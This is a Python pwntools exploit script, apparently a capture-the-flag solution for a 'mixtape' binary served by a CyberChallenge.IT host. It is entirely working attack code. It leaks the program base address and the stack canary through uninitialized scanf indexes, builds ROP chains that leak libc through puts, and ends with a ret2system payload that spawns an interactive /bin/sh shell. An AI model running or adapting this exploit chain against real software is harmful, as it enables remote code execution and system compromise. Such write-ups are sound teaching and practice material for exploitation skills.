#!/usr/bin/env python3

from pwn import *
import re

exe = ELF("./mixtape_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe

CANARY = b''


def conn():
    global r

    if args.LOCAL:
        r = process([exe.path])
        if args.DDEBUG:
            gdb.attach(r)
    else:
        r = remote("mixtape.challs.cyberchallenge.it", 9406)

    return r


def add_song(name: str):
    r.sendlineafter(b'What would you like to do? ', b'1')
    r.sendlineafter(b'What would you like to add? ', name.encode("ascii"))


def print_list():
    r.sendlineafter(b'What would you like to do? ', b'5')


def send_feedback(msg: bytes):
    r.sendlineafter(b'What would you like to do? ', b'6')
    r.sendlineafter(b'leave a complaint here: ', msg)


def leak_base_prog():
    # Taken as an example the "swap_songs" function, indexes are not properly initialized if scanf
    # fails to parse the string (as said in the first hint).
    # Uninitialized indexes, in this case, contain uninitialized values that are the old values in
    # the stack (that are not overwritten!).
    # Moreover, these indexes are at $rsp+0x48 and $rsp+0x44 rispectively (in this function) so we
    # can fill the stack with juicy information (as said in the second hint) like canary and
    # program addresses by printing the mixtape
    print_list()

    r.sendlineafter(b'What would you like to do? ', b'4')
    r.sendlineafter(b'First song?', b'a')
    lower_addr = re.match(rb".*Index ([-]?\d+) is out of range\..*", r.recvline()).group(1)
    lower_addr = int(lower_addr, 10) & 0xFFFFFFFF

    r.sendlineafter(b'What would you like to do? ', b'4')
    r.sendlineafter(b'First song?', b'0')
    r.sendlineafter(b'Second song?', b'a')
    upper_addr = re.match(rb".*Index ([-]?\d+) is out of range\..*", r.recvline()).group(1)
    upper_addr = int(upper_addr, 10) & 0xFFFFFFFF

    exe.address = ((upper_addr << 32) | lower_addr) - 0x18a9
    log.info(f"Program base address: 0x{exe.address:x}")

    exe.symbols['menu'] = exe.address + 0x1946


def leak_canary():
    # Same thing as before (for base program) but this time the leak is a bit tricky since we have
    # to use "replace_song" and "remove_song" to leak the upper and lower part of the canary.
    # In the first case, the index is at $rsp+0x3c, the latter is at $rsp+0x44 but has a different
    # stack frame so, despite the equality in the offsets between this and the one in "leak_base_prog",
    # they are in different positions.
    global CANARY

    print_list()

    r.sendlineafter(b'What would you like to do? ', b'3')
    r.sendlineafter(b'Which one do you want to replace', b'a')
    upper_canary = re.match(rb".*Index ([-]?\d+) is out of range\..*", r.recvline()).group(1)
    upper_canary = int(upper_canary, 10) & 0xFFFFFFFF

    r.sendlineafter(b'What would you like to do? ', b'2')
    r.sendlineafter(b'Which one do you want to remove', b'a')
    lower_canary = re.match(rb".*Index ([-]?\d+) is out of range\..*", r.recvline()).group(1)
    lower_canary = int(lower_canary, 10) & 0xFFFFFFFF

    CANARY = (upper_canary << 32) | lower_canary
    log.info(f"Canary value: 0x{CANARY:x}")


def leak_libc_addr():
    pop_rdi_ret = ROP(exe).find_gadget(['pop rdi', 'ret'])[0]

    payload  = b'A' * 4008 + p64(CANARY) + b'B' * 8
    payload += p64(pop_rdi_ret) + p64(exe.got['puts'])
    payload += p64(exe.plt['puts'])
    payload += p64(exe.symbols['menu'])

    send_feedback(payload)
    libc.address = int.from_bytes(r.recvlines(2)[-1], "little") - libc.symbols["puts"]
    log.info(f"LIBC base address: 0x{libc.address:x}")


def ret2system():
    pop_rdi_ret = ROP(exe).find_gadget(['pop rdi', 'ret'])[0]
    bin_sh = next(libc.search(b'/bin/sh'))

    payload  = b'A' * 4008 + p64(CANARY) + b'B' * 8
    payload += p64(pop_rdi_ret) + p64(bin_sh)   # Loads address of string "/bin/sh"
    payload += p64(pop_rdi_ret + 1)             # Dummy return (1 byte ahead there's ret instruction)
    payload += p64(libc.symbols['system'])      # Calls "system"
    payload += p64(pop_rdi_ret) + p64(0)        # This is just for...
    payload += p64(libc.symbols['exit'])        # ...a clean exit

    send_feedback(payload)
    r.interactive("$ ")


# Hint 1: Some variables are not properly initialized: what happens if you answer "a" to a scanf expecting
#         an integer? When indexes are out of range, you get error messages that might leak something.
#
# Hint 2: Fill the tape (actually, insert at least 11 songs) and print its content to fill the stack with
#         precious information; that is, the canary and program addresses.
def main():
    r = conn()

    for idx in range(11):
        add_song(f"asdrubale{idx}")

    leak_base_prog()
    leak_canary()
    leak_libc_addr()
    ret2system()


if __name__ == "__main__":
    main()
